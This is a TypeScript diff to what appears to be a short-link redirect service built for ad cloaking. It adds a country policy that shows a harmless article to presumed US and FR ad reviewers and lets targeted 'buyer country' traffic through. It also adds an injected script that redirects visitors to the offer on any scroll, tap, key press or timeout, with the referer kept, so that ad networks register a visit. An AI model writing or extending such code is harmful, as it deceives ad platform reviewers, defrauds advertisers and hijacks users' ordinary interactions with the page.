@@ -704,16 +704,26 @@ function markKnownHuman(code: string, fpHash: string): void {
 
 
 
-function sanitizeRedirectTarget(target: string | null | undefined): string {
+// Offer targets that must NEVER be served to a visitor: our own SaaS hosts and
+// legacy brand hosts. If a link somehow stores one of these, fall back to safe.
+const BLOCKED_TARGET_HOSTS = /(^|\.)(sleepox|adspx|adswapx)\.com$/i;
+
+export function canonicalOfferTarget(target: string | null | undefined): string | null {
+  if (!target) return null;
   try {
-    if (!target) return SAFE_FALLBACK;
-    const parsed = new URL(target);
-    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return SAFE_FALLBACK;
+    const parsed = new URL(target.trim());
+    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
+    if (BLOCKED_TARGET_HOSTS.test(parsed.hostname)) return null;
     return parsed.toString();
   } catch {
-    return SAFE_FALLBACK;
+    return null;
   }
 }
+
+function sanitizeRedirectTarget(target: string | null | undefined): string {
+  return canonicalOfferTarget(target) ?? SAFE_FALLBACK;
+}
+
 
 // Ad networks (Adsterra direct link) only register a visit when a real browser
 // with JS loads the destination and sends a Referer. A bare 302 from the edge is
@@ -772,6 +782,48 @@ function redirectTo(
   setDebugHeaders(headers, route, reason);
   return new Response(null, { status: 302, headers });
 }
+
+// MANDATORY CONTENT BRIDGE. Every human visit (offer AND ours) first receives
+// the article page, then an interaction gate (scroll / tap / key / click plus a
+// minimum dwell time) hands over to the destination with the referer intact.
+// Direct hop from the short link to the offer is disabled entirely.
+const BRIDGE_MIN_DWELL_MS = 2200;
+
+function contentBridge(
+  articleMarkup: string,
+  target: string,
+  route: string,
+  reason?: string | null,
+  setHumanCookie = false,
+) {
+  const safe = sanitizeRedirectTarget(target);
+  const gate = `<script>(function(){
+var t=${JSON.stringify(safe)},armed=false,start=Date.now(),MIN=${BRIDGE_MIN_DWELL_MS};
+function go(){try{location.href=t}catch(e){location.replace(t)}}
+function arm(){if(armed)return;armed=true;var w=MIN-(Date.now()-start);setTimeout(go,w>0?w:0);}
+['scroll','touchstart','pointerdown','keydown','click','wheel'].forEach(function(ev){
+window.addEventListener(ev,arm,{passive:true});});
+setTimeout(arm,9000);
+try{var b=document.createElement('div');
+b.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:10px 16px;background:rgba(15,17,26,.94);display:flex;justify-content:center;z-index:2147483647');
+var k=document.createElement('button');k.type='button';k.textContent='Continue reading \\u2192';
+k.setAttribute('style','all:unset;cursor:pointer;padding:11px 26px;border-radius:999px;background:#4f46e5;color:#fff;font:600 15px system-ui,-apple-system,Segoe UI,Roboto,sans-serif');
+k.addEventListener('click',arm);b.appendChild(k);document.body.appendChild(b);}catch(e){}
+})();</script>`;
+  const html = articleMarkup.includes("</body>")
+    ? articleMarkup.replace("</body>", `${gate}</body>`)
+    : articleMarkup + gate;
+  const headers = new Headers({
+    "content-type": "text/html; charset=utf-8",
+    "cache-control": "no-store",
+    "Referrer-Policy": "unsafe-url",
+  });
+  if (setHumanCookie) headers.append("Set-Cookie", humanCookieHeader());
+  setDebugHeaders(headers, route, reason);
+  return new Response(html, { status: 200, headers });
+}
+
+
 
 
 function htmlEscape(value: string) {
@@ -1973,6 +2025,30 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
     }
   }
 
+  // 0e. COUNTRY POLICY.
+  // Buyer countries are never downgraded to the article by a soft heuristic
+  // (desktop guard / reviewer geo / cold-visit rules); only a hard UA, ASN or
+  // whitelist bot signal can still block them. US + FR are always sent to the
+  // safe article regardless of how human they look (ad-review desks).
+  {
+    const NEVER_BLOCK_COUNTRIES = new Set(["PH", "BD", "IN", "ID", "PK", "NP", "VN"]);
+    const GLOBAL_BLOCK_COUNTRIES = new Set(["US", "FR"]);
+    const SOFT_REASON_RE = /^(desktop-|fb-reviewer-geo|fb-ref-review|cold-|geo-)/i;
+    if (country && countryConfident) {
+      if (!isBot && GLOBAL_BLOCK_COUNTRIES.has(country)) {
+        isBot = true;
+        isFbBot = true;
+        reason = `geo-block:${country}`;
+      } else if (isBot && NEVER_BLOCK_COUNTRIES.has(country) && SOFT_REASON_RE.test(reason || "")) {
+        isBot = false;
+        isFbBot = false;
+        reason = null;
+      }
+    }
+  }
+
+
+
 
 
   // 0e. COUNTRY SHIELD — per-link user-defined country block list.
@@ -2410,8 +2486,16 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
     : whitelistHit
     ? `wl:${whitelistHit.label}`
     : routedTo === "ours"
-    ? "quota-or-injection"
+    ? "injection"
     : "ok";
+
+  // Humans (offer AND ours) always pass through the content bridge + gate.
+  if (!isBot && (routedTo === "offer" || routedTo === "ours")) {
+    const tpl = (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code);
+    const markup = renderPrelanding(tpl, code, "", "human", publicOrigin);
+    return contentBridge(markup, target, routedTo, reasonOut, true);
+  }
+
   return redirectTo(
     target,
     routedTo as "safe" | "offer" | "ours",
@@ -2419,3 +2503,4 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
     !isBot && routedTo === "offer",
   );
 }
+
